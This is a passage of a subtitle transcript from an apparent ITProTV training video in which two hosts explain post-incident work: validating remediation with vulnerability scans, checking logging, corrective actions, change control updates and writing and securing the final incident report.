compromise,\n\n222\n00:10:07.240 --> 00:10:11.390\nwe feel like we've remediated the problem,\nhow would I check that?\n\n223\n00:10:11.390 --> 00:10:12.010\n&gt;&gt; I would say,\n\n224\n00:10:12.010 --> 00:10:14.443\na vulnerability scanner\nmight be what you wanted.\n\n225\n00:10:14.443 --> 00:10:18.513\nTo make sure, one, that you're fix,\nwhatever it is you applied has taken\n\n226\n00:10:18.513 --> 00:10:22.920\naway that vulnerability as well as not\nintroduced any new vulnerabilities.\n\n227\n00:10:22.920 --> 00:10:25.840\nNot unheard of.\n&gt;&gt; Mike's a smart man, listen to Mike.\n\n228\n00:10:25.840 --> 00:10:27.410\nHe knows what he is talking about.\n\n229\n00:10:27.410 --> 00:10:28.220\nThat is exactly right.\n\n230\n00:10:28.220 --> 00:10:30.680\nWe discussed this throughout\nthe series really.\n\n231\n00:10:30.680 --> 00:10:33.370\nOnce something has happened and\nchanges have been made.\n\n232\n00:10:33.370 --> 00:10:37.340\nWe always, what we should be\nmaking a policy to re-run\n\n233\n00:10:37.340 --> 00:10:41.650\nvulnerability scans to see if\nthe vulnerability that was\n\n234\n00:10:41.650 --> 00:10:44.990\nused to compromise the system is\nstill a vulnerability in the system.\n\n235\n00:10:44.990 --> 00:10:47.140\nHave we effectively remediated it?\n\n236\n00:10:47.140 --> 00:10:50.620\nSo we're validating that, they're\nusing our scanner, firing it back off,\n\n237\n00:10:50.620 --> 00:10:51.930\nseeing if it shows back up.\n\n238\n00:10:51.930 --> 00:10:55.260\nIf it does, then we need to take\nfurther steps of remediation\n\n239\n00:10:55.260 --> 00:10:58.630\nuntil it no longer shows up\nin our vulnerability scans.\n\n240\n00:10:58.630 --> 00:11:02.300\nVerify at least we've done our\ndue diligence in seeing, well,\n\n241\n00:11:02.300 --> 00:11:07.560\nwe are pretty sure that this\nis no longer a problem.\n\n242\n00:11:07.560 --> 00:11:10.410\nWe've run the scan, it no longer shows up.\n\n243\n00:11:10.410 --> 00:11:13.140\nWe've patched the system and\ntherefore the hole is closed.\n\n244\n00:11:13.140 --> 00:11:17.810\nAnd remember, our vulnerability scanners\na lot of times will give you suggested\n\n245\n00:11:17.810 --> 00:11:19.360\nremediation tactics, right?\n\n246\n00:11:19.360 --> 00:11:24.060\nThey'll say, hey, apply the vendor\npatch or update to the latest version.\n\n247\n00:11:24.060 --> 00:11:26.940\nHey, do this, do that,\nand we just follow that.\n\n248\n00:11:26.940 --> 00:11:30.030\nLook at that CDE data and\nsee what they're saying about it and\n\n249\n00:11:30.030 --> 00:11:33.260\nsee how we can mitigate around these\n\n250\n00:11:33.260 --> 00:11:34.870\ndifferent vulnerabilities\nthat might be in our system.\n\n251\n00:11:34.870 --> 00:11:39.161\nAnd once we've done, we should be able\nto fire that vulnerability scan off and\n\n252\n00:11:39.161 --> 00:11:42.489\nsee no longer does it show as\na threat to my institution.\n\n253\n00:11:42.489 --> 00:11:45.904\nI should be able to\nmove along accordingly.\n\n254\n00:11:47.420 --> 00:11:52.447\nAnd then lastly, verify logging and\ncommunications like so if you\n\n255\n00:11:52.447 --> 00:11:59.340\nset up syslog, make sure that the syslog\nserver is actually receiving logs from.\n\n256\n00:11:59.340 --> 00:12:01.600\nThe other devices that\nare meant to send it.\n\n257\n00:12:01.600 --> 00:12:04.100\nThis is a little bit of a manual thing,\nyou'd probably write a script for\n\n258\n00:12:04.100 --> 00:12:04.680\nthese things.\n\n259\n00:12:04.680 --> 00:12:09.080\nBut it's still a bit of a manual\nslog when you're saying,\n\n260\n00:12:09.080 --> 00:12:11.490\nall right let me look in\nfront of my syslog server and\n\n261\n00:12:11.490 --> 00:12:15.580\nverify that these are the IPs that\nshould be sending or showing up, rght?\n\n262\n00:12:15.580 --> 00:12:17.630\nIt's sending it's syslog information.\n\n263\n00:12:17.630 --> 00:12:19.600\nIf not, why not?\n\n264\n00:12:19.600 --> 00:12:21.910\nBecause I might not be\ngetting the information or\n\n265\n00:12:21.910 --> 00:12:24.500\nalerts that I need through\nwhatever monitor software.\n\n266\n00:12:24.500 --> 00:12:27.843\nIt could be Syslog,\ncould be some third-party monitoring,\n\n267\n00:12:27.843 --> 00:12:31.600\nSolarWinds, whatever are seen.\n\n268\n00:12:31.600 --> 00:12:34.250\nCould be OSSIM, Alien Vault, whatever.\n\n269\n00:12:34.250 --> 00:12:37.650\nIf it's not giving me the information\nbecause it's not receiving it,\n\n270\n00:12:37.650 --> 00:12:40.530\nit's doing me a whole lot of not good,\nright?\n\n271\n00:12:40.530 --> 00:12:44.220\nSo we must be doing our due diligence and\nverifying that these systems\n\n272\n00:12:44.220 --> 00:12:48.110\nare active in a way that we\nbelieve they should be active.\n\n273\n00:12:48.110 --> 00:12:51.960\nAnd unfortunately a lot of\ntimes it takes an incident,\n\n274\n00:12:51.960 --> 00:12:55.785\nan incident to prod that type of activity.\n\n275\n00:12:55.785 --> 00:13:00.240\nWe've become very reactive just because I\nunderstand, trust me we're busy people.\n\n276\n00:13:00.240 --> 00:13:04.170\nThere's a lot to do, and we're\ntypically underfunded and understaffed.\n\n277\n00:13:05.730 --> 00:13:08.200\nWe just around to it\nwhen we get around to it.\n\n278\n00:13:08.200 --> 00:13:11.482\nLike I said unfortunately it's\nusually incident that says,\n\n279\n00:13:11.482 --> 00:13:12.680\nhey we need to check and\n\n280\n00:13:12.680 --> 00:13:16.990\nmake sure that Syslog server is actually\nreceiving data from the other devices.\n\n281\n00:13:16.990 --> 00:13:20.271\nCuz if it's not I'm not gonna get\nthose alerts that tell me, hey,\n\n282\n00:13:20.271 --> 00:13:21.630\nyou need to check this out.\n\n283\n00:13:21.630 --> 00:13:25.890\nMy IDS isn't sending me alerts to tell me,\nhey, because it's, how about that?\n\n284\n00:13:25.890 --> 00:13:27.150\nIt's not working.\n&gt;&gt; [LAUGH]\n\n285\n00:13:27.150 --> 00:13:28.810\n&gt;&gt; So verify all these things that\n\n286\n00:13:28.810 --> 00:13:31.450\nare working and the communication\nchannels are up and running.\n\n287\n00:13:31.450 --> 00:13:34.140\nTest them, verify, test and verify.\n\n288\n00:13:34.140 --> 00:13:39.670\nMake it a scheduled part of your work\ncycle is something you're going to want.\n\n289\n00:13:39.670 --> 00:13:43.990\nMake that part of your workload, whether\nit's every month, every six months.\n\n290\n00:13:43.990 --> 00:13:49.125\nSomething is better than nothing, so\ntry to add that to the work flow.\n\n291\n00:13:49.125 --> 00:13:54.395\nAll right, Mike, I think that's about\nall we've got as far as validation goes.\n\n292\n00:13:54.395 --> 00:13:58.591\nSo remember, we've got patching,\ncheck permissions, do you vulnerability\n\n293\n00:13:58.591 --> 00:14:02.735\nscannings to assess whether or not your\nremediation tactics were effective.\n\n294\n00:14:02.735 --> 00:14:06.100\nAnd then verify that all the logging\nmechanisms that you have in\n\n295\n00:14:06.100 --> 00:14:09.148\nplace are actually doing their job and\nsending alerts and\n\n296\n00:14:09.148 --> 00:14:12.160\ncollecting that data that you need.\n&gt;&gt; All right, Daniel, so\n\n297\n00:14:12.160 --> 00:14:14.160\nwhat comes after validation?\n&gt;&gt; Well,\n\n298\n00:14:14.160 --> 00:14:16.680\nwe take some more corrective actions,\nright?\n\n299\n00:14:16.680 --> 00:14:19.850\nSo we validated that,\nwhen I say corrective actions,\n\n300\n00:14:19.850 --> 00:14:24.575\nwhat I mean is, how do we make sure that\nthese things don't happen in the future?\n\n301\n00:14:24.575 --> 00:14:27.710\nOne is following those techniques\nthat we're going to validate,\n\n302\n00:14:27.710 --> 00:14:30.120\nwhich is patching and\nall that other good stuff.\n\n303\n00:14:30.120 --> 00:14:34.070\nBut, we also need to kind\nof take a step back and\n\n304\n00:14:34.070 --> 00:14:38.160\nlook at the incident as a whole and\nkind of figure out.\n\n305\n00:14:38.160 --> 00:14:41.520\nAnd this goes back to our\nincidence response plan.\n\n306\n00:14:41.520 --> 00:14:43.430\nWhat do we learn from this?\n\n307\n00:14:43.430 --> 00:14:46.630\nRight, why were these\nthings able to occur?\n\n308\n00:14:46.630 --> 00:14:49.125\nWhat were we doing that facilitated that?\n\n309\n00:14:49.125 --> 00:14:51.370\n[COUGH] Excuse me again.\n\n310\n00:14:51.370 --> 00:14:56.772\nAnd how can we fix it?\n&gt;&gt; Was our patching schedule a little lax?\n\n311\n00:14:56.772 --> 00:15:00.960\nWas misconfiguration something\nwe didn't pick up on?\n\n312\n00:15:00.960 --> 00:15:03.570\nSomething that we can then\ntake into the future and\n\n313\n00:15:03.570 --> 00:15:06.110\nhopefully prevent.\n&gt;&gt; Right, this is the just asking\n\n314\n00:15:06.110 --> 00:15:09.680\nthe whole who, what, when, where,\nwhy and how kinda questions.\n\n315\n00:15:09.680 --> 00:15:11.340\nWhat happened?\n\n316\n00:15:11.340 --> 00:15:13.010\nHow did it happen?\n\n317\n00:15:13.010 --> 00:15:14.690\nHow do we prevent it?\n\n318\n00:15:14.690 --> 00:15:17.720\nYou know, what was effected?\n\n319\n00:15:17.720 --> 00:15:19.080\nFor what duration?\n\n320\n00:15:19.080 --> 00:15:22.899\nRight, just trying to figure out\nall the details that went on inside\n\n321\n00:15:22.899 --> 00:15:23.907\nof the incident.\n\n322\n00:15:23.907 --> 00:15:29.966\nAnd figuring out, how come, if our\nsystem was compromised on May the 3rd,\n\n323\n00:15:29.966 --> 00:15:34.740\nat 2:19 AM and\nwe didn't discover it until May 24th.\n\n324\n00:15:34.740 --> 00:15:37.460\nWhy is it that we didn't discover that?\n\n325\n00:15:37.460 --> 00:15:40.381\nSee these are things we want to\ntake away from the incident and\n\n326\n00:15:40.381 --> 00:15:42.510\nthat is what we mean\nby corrective actions.\n\n327\n00:15:42.510 --> 00:15:45.130\nWe are going to look at those things and\nfigure out\n\n328\n00:15:45.130 --> 00:15:49.490\nwell there wasn't a control in place\nthat would facilitate us discovering it.\n\n329\n00:15:49.490 --> 00:15:52.411\nWe didn't have an IDS or\nmonitoring system we need to do that.\n\n330\n00:15:52.411 --> 00:15:56.551\nWe need to add a monitoring system in\nplace so we would have detected that\n\n331\n00:15:56.551 --> 00:16:00.762\nearlier, and therefore reducing\nthe fall outs Of the incident itself.\n\n332\n00:16:00.762 --> 00:16:03.312\nSo that is what I mean\nby corrective action.\n\n333\n00:16:03.312 --> 00:16:08.306\nWe need to take away those lessons learned\nand figure out where we can improve,\n\n334\n00:16:08.306 --> 00:16:11.786\nhow we can do better,\nhow we can increase efficiency or\n\n335\n00:16:11.786 --> 00:16:16.280\nadd something into the system that\nwould give us more early warning.\n\n336\n00:16:16.280 --> 00:16:18.493\nWhatever the case is,\nwhatever the lessons you learn from it,\n\n337\n00:16:18.493 --> 00:16:20.051\nthat's what you need to\nbe taking a look at.\n\n338\n00:16:20.051 --> 00:16:24.320\nThen, the change control process.\n\n339\n00:16:24.320 --> 00:16:28.340\nRemember, most organizations use\nsome form of change management.\n\n340\n00:16:28.340 --> 00:16:31.740\nThey say, if you wanna make\na change inside of the system,\n\n341\n00:16:31.740 --> 00:16:34.720\nit has to be requested,\nauthorization has to occur.\n\n342\n00:16:34.720 --> 00:16:38.771\nOnce authorization has occurred,\nthe worker then performs the action,\n\n343\n00:16:38.771 --> 00:16:41.204\ndocumenting that throughout the process.\n\n344\n00:16:41.204 --> 00:16:46.049\nAny other changes that will be required,\nbecause they come up tertiarily, will be,\n\n345\n00:16:46.049 --> 00:16:48.358\nagain, added, approved, returned.\n\n346\n00:16:48.358 --> 00:16:50.540\nA lot of red tape going on, right?\n\n347\n00:16:50.540 --> 00:16:52.275\nThat's the normal change process.\n\n348\n00:16:52.275 --> 00:16:56.091\nBut when an incident occurs,\ntypically these change management systems\n\n349\n00:16:56.091 --> 00:17:00.167\nare bypassed because expediency is\nthe name of the game at this point, right?\n\n350\n00:17:00.167 --> 00:17:04.230\nSpeed is keying inside of\nan incident when an incident occurs.\n\n351\n00:17:04.230 --> 00:17:06.510\nSo we're just forgetting\nchange management.\n\n352\n00:17:06.510 --> 00:17:10.530\nI've got all my stakeholders coming to\nplay, which hopefully includes management\n\n353\n00:17:10.530 --> 00:17:14.070\nof some form, and\nthey're authorizing things on the fly.\n\n354\n00:17:14.070 --> 00:17:18.370\nBut when everything's all said and\ndone, remember, this is afterwards,\n\n355\n00:17:18.370 --> 00:17:22.820\nthis is post-incident,\nwe need to go back to change management.\n\n356\n00:17:22.820 --> 00:17:26.430\nAnd inside of that change\nmanagement system, document and\n\n357\n00:17:26.430 --> 00:17:30.610\nput this almost anachronistically,\nkind of putting it in there.\n\n358\n00:17:30.610 --> 00:17:34.400\nHere's something that happened, here's\nwhat we did, here were the authorizations,\n\n359\n00:17:34.400 --> 00:17:37.720\nhere's all the forms that were necessary,\nhere's where you can find those.\n\n360\n00:17:37.720 --> 00:17:40.370\nMaybe you stored them on your intranet or\nwhatever.\n\n361\n00:17:40.370 --> 00:17:44.190\nAnd now it's documented inside\nof that change control system.\n\n362\n00:17:44.190 --> 00:17:48.860\nAgain, this is for posterity, anybody that\ncomes across an incident that similar,\n\n363\n00:17:48.860 --> 00:17:52.320\nthey would be able to look at the change\nmanagement and at least get some quick and\n\n364\n00:17:52.320 --> 00:17:55.560\ndirty idea of what occurred.\n\n365\n00:17:55.560 --> 00:18:00.688\nHopefully there's also some point to here\nare the details of the post incident and\n\n366\n00:18:00.688 --> 00:18:04.620\nreports that you can look at for\nfurther information, right?\n\n367\n00:18:04.620 --> 00:18:09.590\nSo make sure you do that just because it's\na very good possibility that the change\n\n368\n00:18:09.590 --> 00:18:15.370\ncontrols have been bypassed during\nthe incident until it was completed.\n\n369\n00:18:15.370 --> 00:18:17.786\nAnd now we need to add that\nto the rest of the system.\n\n370\n00:18:17.786 --> 00:18:22.105\nAnd then make sure you update your\nincident response plan with anything that\n\n371\n00:18:22.105 --> 00:18:23.460\nyou did learn, right?\n\n372\n00:18:23.460 --> 00:18:26.710\nGo back and say, all right,\nthis is stuff that we need to\n\n373\n00:18:26.710 --> 00:18:29.110\nhave been doing that we weren't,\nwe've figured that out.\n\n374\n00:18:29.110 --> 00:18:32.650\nOr our incident response plan\nkinda left us hanging here,\n\n375\n00:18:32.650 --> 00:18:37.380\nwe were a little unsure of how to operate,\nit wasn't clear.\n\n376\n00:18:37.380 --> 00:18:41.520\nWhatever you find out, any problems,\nor additions, or subtractions to\n\n377\n00:18:41.520 --> 00:18:45.748\nthe incident response plan, go ahead and\nmake those at that point in time.\n\n378\n00:18:45.748 --> 00:18:49.041\nIt's a good place to do that.\n&gt;&gt; Yeah, absolutely, you test your\n\n379\n00:18:49.041 --> 00:18:53.695\nincident response plan regularly, but\nstill nothing compares to the real thing.\n\n380\n00:18:53.695 --> 00:18:57.210\nThere's gonna be some unknowns that get\nintroduced and maybe these are things that\n\n381\n00:18:57.210 --> 00:19:01.860\nwe can look for or update our plans to\ntake care of in future incident responses.\n\n382\n00:19:01.860 --> 00:19:03.240\n&gt;&gt; Exactly, Mike.\n\n383\n00:19:03.240 --> 00:19:05.421\nSo that's the key takeaway from that.\n\n384\n00:19:05.421 --> 00:19:09.681\nMake sure she go back to your change\nmanagement, make sure you update your\n\n385\n00:19:09.681 --> 00:19:13.943\nincident response plan with all of\nthose wonderful lessons learned [LAUGH]\n\n386\n00:19:13.943 --> 00:19:17.453\nthat came about due to that incident.\n&gt;&gt; All right, Daniel,\n\n387\n00:19:17.453 --> 00:19:20.700\nso we've done our recovery,\nwe've gone through and\n\n388\n00:19:20.700 --> 00:19:26.210\nwe've updated our change management,\nor change control, I should say.\n\n389\n00:19:26.210 --> 00:19:29.381\nNow we've gotta kinda finalize everything,\nright?\n\n390\n00:19:29.381 --> 00:19:32.130\nThe people up there that\nsign my paychecks wanna know\n\n391\n00:19:32.130 --> 00:19:35.090\nwhat the heck happened, what was going on?\n&gt;&gt; It's funny that\n\n392\n00:19:35.090 --> 00:19:36.160\nthat works out that way.\n\n393\n00:19:36.160 --> 00:19:40.480\nHe's absolutely right, these people tend\nto wanna know why they're paying us.\n\n394\n00:19:40.480 --> 00:19:43.690\nWeird, kinda funny, but it's true,\nso you gotta work with that.\n\n395\n00:19:43.690 --> 00:19:44.530\nAnd Mike's right,\n\n396\n00:19:44.530 --> 00:19:49.020\nyou need to put some sort of fork\nin this potato because it's done.\n\n397\n00:19:49.020 --> 00:19:50.540\nWell, what is that fork?\n\n398\n00:19:50.540 --> 00:19:52.720\nThat is your finalized report, right?\n\n399\n00:19:52.720 --> 00:19:56.530\nThis is the incident summary report,\nthe post incident summary report,\n\n400\n00:19:56.530 --> 00:19:57.350\nwhatever you'd like to call it.\n\n401\n00:19:58.450 --> 00:20:01.832\nThis is a formal report that you\nwill submit, so spell check it,\n\n402\n00:20:01.832 --> 00:20:05.670\nmake sure your grammar and stuff is\ncorrect cuz people need to read this.\n\n403\n00:20:05.670 --> 00:20:10.800\nAnytime you're creating any kind of\nreport, it needs to be as easily read and\n\n404\n00:20:10.800 --> 00:20:13.780\ndigested by the reader as possible.\n\n405\n00:20:13.780 --> 00:20:15.879\nWhich is probably a pet peeve of mine.\n\n406\n00:20:15.879 --> 00:20:18.749\nWhen you read a lot of\ndocumentation on things, and\n\n407\n00:20:18.749 --> 00:20:23.020\nI'm sure you folks out there as well\nwill sympathize with me on this, Mike,\n\n408\n00:20:23.020 --> 00:20:25.710\nI’m sure you will, you read these things.\n\n409\n00:20:25.710 --> 00:20:28.234\nI think of the line from Beetlejuice.\n\n410\n00:20:28.234 --> 00:20:30.760\nThis thing reads like stereo instructions.\n&gt;&gt; [LAUGH]\n\n411\n00:20:30.760 --> 00:20:34.100\n&gt;&gt; It's horrible, it's overly verbose,\n\n412\n00:20:34.100 --> 00:20:38.810\nit's wordy, it uses terminology that\nyou wouldn't use in everyday speech,\n\n413\n00:20:38.810 --> 00:20:40.840\nwhich makes it more difficult to follow.\n\n414\n00:20:40.840 --> 00:20:44.110\nNow, as technical people,\nthat might be okay for\n\n415\n00:20:44.110 --> 00:20:45.770\nus cuz we kinda understand that lingo.\n\n416\n00:20:45.770 --> 00:20:49.980\nEven though still, probably you're making\nit more difficult to necessary to read.\n\n417\n00:20:49.980 --> 00:20:53.990\nWe wanna avoid that as much as possible.\n&gt;&gt; And\n\n418\n00:20:53.990 --> 00:20:58.430\nreally, probably the majority of the\npeople that are going to be consuming this\n\n419\n00:20:58.430 --> 00:21:02.290\nreport are not as technical as the people\nthat are generating these reports.\n\n420\n00:21:02.290 --> 00:21:04.030\n&gt;&gt; Exactly, if someone's gonna read this,\n\n421\n00:21:04.030 --> 00:21:06.530\nlike Mike said,\nthis is the people that cut our paychecks.\n\n422\n00:21:06.530 --> 00:21:09.600\nThey don't want you to dazzle them\nwith all the technical know-how,\n\n423\n00:21:09.600 --> 00:21:12.920\nnot that there won't be technical\naspects to the finalized report.\n\n424\n00:21:12.920 --> 00:21:16.500\nThere will be, there'll be the very\ntechnical portions that aren't for them,\n\n425\n00:21:16.500 --> 00:21:20.150\nthat are for technicians that\nare able to look at that and go,\n\n426\n00:21:20.150 --> 00:21:23.530\nI understand what this type of attack\nwas and how that was perpetrated.\n\n427\n00:21:23.530 --> 00:21:27.800\nHere's the step-by-step procedure\nthat was used to infiltrate and\n\n428\n00:21:27.800 --> 00:21:32.662\nthen to remediate the system here,\nall the technical aspects of the incident.\n\n429\n00:21:32.662 --> 00:21:37.804\nBut you also had to speak to those C Level\npeople, those average everyday user\n\n430\n00:21:37.804 --> 00:21:43.519\nthat might not understand that jargon, so\nmake sure that your report is easily read.\n\n431\n00:21:43.519 --> 00:21:48.987\nBut this is us telling the story in\nsome detail of what the incident was,\n\n432\n00:21:48.987 --> 00:21:52.840\nthis is going to be a reference for\nfuture people.\n\n433\n00:21:52.840 --> 00:21:55.568\nMaybe I'm not with the company\nten years down the road, or\n\n434\n00:21:55.568 --> 00:21:58.796\nfour years down the road,\ntwo years down the road, maybe I've moved\n\n435\n00:21:58.796 --> 00:22:01.325\non to greener pastures or [CROSSTALK]\n&gt;&gt; Or after this incident.\n\n436\n00:22:01.325 --> 00:22:04.279\n[LAUGH]\n&gt;&gt; [LAUGH] I'm gonna print my resume on my\n\n437\n00:22:04.279 --> 00:22:05.440\nway out, right?\n\n438\n00:22:05.440 --> 00:22:10.000\nBut you want to basically, for posterity\npurposes, for people coming along,\n\n439\n00:22:10.000 --> 00:22:14.330\nnewbies that have finally made\ntheir bones and they've made it to\n\n440\n00:22:14.330 --> 00:22:19.480\nthe top level of the tech side of\nthings inside of your organization.\n\n441\n00:22:19.480 --> 00:22:22.430\nAnd now an incident has occurred,\nthey've never seen that before.\n\n442\n00:22:22.430 --> 00:22:23.030\nWhat do they do?\n\n443\n00:22:23.030 --> 00:22:25.173\nThey're the one that's on-call now.\n\n444\n00:22:25.173 --> 00:22:26.380\nWhat do I do?\n\n445\n00:22:26.380 --> 00:22:30.910\nGrab that incident, all right, this has\nhappened before, here's the repository\n\n446\n00:22:30.910 --> 00:22:33.760\nof it, I know I keep grabbing out of\nthe air like if I click on the link,\n\n447\n00:22:33.760 --> 00:22:35.116\nthat takes me to the incident report.\n\n448\n00:22:35.116 --> 00:22:40.570\n[LAUGH] At last we go, okay, so we've\nbeen hit with a SQL injection attack and\n\n449\n00:22:40.570 --> 00:22:44.580\nour server has been compromised,\ndata has been infiltrated, what do I do?\n\n450\n00:22:44.580 --> 00:22:45.850\nHey, that's happened before.\n\n451\n00:22:45.850 --> 00:22:47.150\nMan, someone's fired.\n\n452\n00:22:47.150 --> 00:22:49.590\n[LAUGH] No, it's happening again.\n\n453\n00:22:49.590 --> 00:22:53.240\nAnd obviously there's a chink in our\narmy here that we need to go through.\n\n454\n00:22:53.240 --> 00:22:57.540\nBut they will want to be able to\nrecreate the steps of remediation and\n\n455\n00:22:57.540 --> 00:23:01.360\nthen follow the same idea of\nthe validation that the steps worked.\n\n456\n00:23:01.360 --> 00:23:05.392\nAnd then we're gonna be looking at those\nlessons learned all over again to see what\n\n457\n00:23:05.392 --> 00:23:06.045\nwent wrong.\n\n458\n00:23:06.045 --> 00:23:08.560\nBut it does happen, so just be aware.\n\n459\n00:23:08.560 --> 00:23:11.570\nAnd then, again,\nupdate the incident response plan.\n\n460\n00:23:11.570 --> 00:23:16.475\nWe're always updating this thing because\nit's constantly evolving, right?\n\n461\n00:23:16.475 --> 00:23:17.530\nLet's see here.\n\n462\n00:23:17.530 --> 00:23:22.720\nAlso, it's a legal document, so this might\nbe something that you'll be submitting\n\n463\n00:23:22.720 --> 00:23:27.470\nas legal evidence into a case\nif it's a criminal case.\n\n464\n00:23:27.470 --> 00:23:31.370\nSo again, you wanna make it as\neasily digestible as possible,\n\n465\n00:23:31.370 --> 00:23:37.230\nas detailed as possible as well, so that\nno stone is left unturned kind of idea for\n\n466\n00:23:37.230 --> 00:23:39.460\nthe legal team if they need to prosecute.\n\n467\n00:23:39.460 --> 00:23:41.093\nAll right,\nwhat elements are inside of this thing?\n\n468\n00:23:41.093 --> 00:23:45.464\nThis will be root cause analysis,\ntimeline of incidents and responses,\n\n469\n00:23:45.464 --> 00:23:48.705\nbasically just laying out\nhere's where it started and\n\n470\n00:23:48.705 --> 00:23:53.019\nhere's how we finally put a nail in\nthe coffin of it and we called it a day.\n\n471\n00:23:53.019 --> 00:23:56.070\nFrom soup to nuts,\nhere are the things that occurred.\n\n472\n00:23:56.070 --> 00:23:59.975\nAny evidence details, fallouts.\n\n473\n00:23:59.975 --> 00:24:05.587\nWas there any fallout monetarily,\nmaybe reputationally, maybe both, right?\n\n474\n00:24:05.587 --> 00:24:09.407\nSo these things definitely occur on\nthe regular, which is unfortunate.\n\n475\n00:24:09.407 --> 00:24:12.911\nYour validation results will go in here,\nas well,\n\n476\n00:24:12.911 --> 00:24:17.885\nthat we tested mitigation, made sure and\nvalidated that they did work.\n\n477\n00:24:17.885 --> 00:24:21.263\nHere are those test results,\nthose will be in there as well.\n\n478\n00:24:21.263 --> 00:24:24.993\nAnd then any discovered in weaknesses and\npolicies or procedures, basically those\n\n479\n00:24:24.993 --> 00:24:28.326\nlessons learned in the takeaway.\n&gt;&gt; And this is an area where some of those\n\n480\n00:24:28.326 --> 00:24:31.766\nsuites that we talked about earlier\ncan really come in handy, right.\n\n481\n00:24:31.766 --> 00:24:37.689\nWe said you could use things like\nAutopsy and The Sleuth Kit and EnCase.\n\n482\n00:24:37.689 --> 00:24:39.551\nAnd they have great\nreporting features built-in.\n\n483\n00:24:39.551 --> 00:24:42.770\nYou could accomplish the same thing\nusing individual tools, but man,\n\n484\n00:24:42.770 --> 00:24:46.112\nthose tools are really nice when it\ncomes up to summarizing all this data.\n\n485\n00:24:46.112 --> 00:24:47.516\n&gt;&gt; I know, I love to be able to hit\n\n486\n00:24:47.516 --> 00:24:49.300\na button that says reports.\n&gt;&gt; Yes.\n\n487\n00:24:49.300 --> 00:24:51.213\n[LAUGH]\n&gt;&gt; [LAUGH] And then you go print,\n\n488\n00:24:51.213 --> 00:24:53.444\nthank you, right,\ncuz all that stuff's in there.\n\n489\n00:24:53.444 --> 00:24:57.171\nIt should be kinda building\nitself up to this point in time.\n\n490\n00:24:57.171 --> 00:24:58.637\n&gt;&gt; Cuz everything you do is you're logging\n\n491\n00:24:58.637 --> 00:25:00.967\nin your evidence,\nas you're going through and running tests,\n\n492\n00:25:00.967 --> 00:25:03.969\nit's all saved within that suite.\n&gt;&gt; Right, and most of these suites\n\n493\n00:25:03.969 --> 00:25:08.302\nalso have the whole chronology section or\ntimelines saying, data was accessed at\n\n494\n00:25:08.302 --> 00:25:12.780\nthis time, here's what so-and-so user did\nwhen they accessed the image of that.\n\n495\n00:25:12.780 --> 00:25:17.607\nAll that stuff is being\nautomatically discovered for you and\n\n496\n00:25:17.607 --> 00:25:22.537\nkept in so that you can build that\nreport out and send that out.\n\n497\n00:25:22.537 --> 00:25:26.538\nSo this should be simple, but if you're\nnot using something like Autopsy or\n\n498\n00:25:26.538 --> 00:25:30.054\nEnCase, FTK, whatever,\nyou can revert to that manual process.\n\n499\n00:25:30.054 --> 00:25:33.513\nIt's a little time consuming but\nthat's kinda part of the job,\n\n500\n00:25:33.513 --> 00:25:34.740\nto be honest with you.\n\n501\n00:25:34.740 --> 00:25:38.473\nYou're gonna spend time filing out\nreports and making reports, and\n\n502\n00:25:38.473 --> 00:25:40.018\ndoing lessons learned, and\n\n503\n00:25:40.018 --> 00:25:44.152\nsitting in a round-table doing like\nan after action kinda discovery, so.\n\n504\n00:25:44.152 --> 00:25:49.254\nLast thing you wanna take away from this\nis, once the report is finalized and\n\n505\n00:25:49.254 --> 00:25:53.251\nsubmitted, you'll want to,\nwhat's the word, secure.\n\n506\n00:25:53.251 --> 00:25:57.918\n[LAUGH] Because there's probably some\nvery sensitive data inside of there.\n\n507\n00:25:57.918 --> 00:25:59.563\nHere's how you can break into our system,\n\n508\n00:25:59.563 --> 00:26:00.179\nright.\n&gt;&gt; Yeah,\n\n509\n00:26:00.179 --> 00:26:03.049\nhere's what we were vulnerable to,\nhere's why we were vulnerable.\n\n510\n00:26:03.049 --> 00:26:03.786\n&gt;&gt; Exactly.\n\n511\n00:26:03.786 --> 00:26:05.076\n&gt;&gt; Here's what we've done about it,\n\n512\n00:26:05.076 --> 00:26:08.284\nall that stuff is in there.\n&gt;&gt; Probably, don't wanna leave that lying\n\n513\n00:26:08.284 --> 00:26:12.473\naround for average everyday Joe or Jane\nto pick up and peruse at their leisure.\n\n514\n00:26:12.473 --> 00:26:16.655\nSo, make sure you secure this in some way,\nshape, or form.\n\n515\n00:26:16.655 --> 00:26:19.910\nMaybe through encryption if you're keeping\nit digitally, or if it's hard-coded,\n\n516\n00:26:19.910 --> 00:26:21.124\nkeeping it in a fireproof safe.\n\n517\n00:26:21.124 --> 00:26:25.606\nOr some area of your building that\nis unaccessible by other than\n\n518\n00:26:25.606 --> 00:26:29.507\nauthorized personnel that\nwould need access to that.\n\n519\n00:26:29.507 --> 00:26:32.299\nRemember, if I can say it,\n&gt;&gt; [LAUGH]\n\n520\n00:26:32.299 --> 00:26:33.392\n&gt;&gt; I wanna say privilege of least\n\n521\n00:26:33.392 --> 00:26:34.447\nprivilege, but it's not.\n\n522\n00:26:34.447 --> 00:26:36.653\nIt's principle of least privilege, again,\n\n523\n00:26:36.653 --> 00:26:40.225\nmy brain just does weird things from\ntime to time, but that's one of them.\n\n524\n00:26:40.225 --> 00:26:43.141\nSo make sure you secure it up,\nand you should be good to go.\n\n525\n00:26:43.141 --> 00:26:47.283\nMike, that being said, I think that's all\nwe need as far as the post-incident and\n\n526\n00:26:47.283 --> 00:26:49.889\nrecovery session.\n&gt;&gt; All right, Daniel, great stuff there.\n\n527\n00:26:49.889 --> 00:26:52.479\nRemember, this was a part two,\nmake sure you check out part one.\n\n528\n00:26:52.479 --> 00:26:54.454\nHope everybody out there\nenjoyed watching this one.\n\n529\n00:26:54.454 --> 00:26:57.326\nSigning off for ITProTV,\nI've been your host, Mike Rodrick.\n\n530\n00:26:57.326 --> 00:26:58.099\n&gt;&gt; I'm Daniel Lowrie.\n\n531\n00:26:58.099 --> 00:26:58.895\n&gt;&gt; And we'll see you next time.\n\n532\n00:26:58.895 --> 00:27:06.092\n[MUSIC]\n\n533\n00:27:06.092 --> 00:27:08.725\n&gt;&gt; Thank you for watching ITProTV.\n\n",

